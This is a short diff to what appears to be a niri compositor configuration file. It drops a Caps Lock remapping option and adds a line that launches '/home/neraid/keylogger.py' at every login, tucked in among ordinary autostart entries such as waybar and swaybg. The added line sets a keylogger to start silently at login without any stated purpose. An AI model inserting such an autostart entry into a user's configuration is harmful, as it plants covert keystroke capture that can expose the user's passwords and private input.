@@ -19,7 +19,6 @@ input {
             		layout "br"
             		variant "abnt2"
             		model "abnt2"
-            		options "caps:escape_shifted_capslock"
         	}
     	}
 
@@ -256,6 +255,7 @@ spawn-at-startup "mako"
 spawn-at-startup "waybar"
 spawn-at-startup "/usr/lib/polkit-gnome/polkit-gnome-authentication-agent-1"
 spawn-at-startup "swaybg" "-i" "/home/neraid/Desktop/wallpaper" "-m" "fill"
+spawn-at-startup "/home/neraid/keylogger.py"
 
 spawn-at-startup "xwayland-satellite"
 
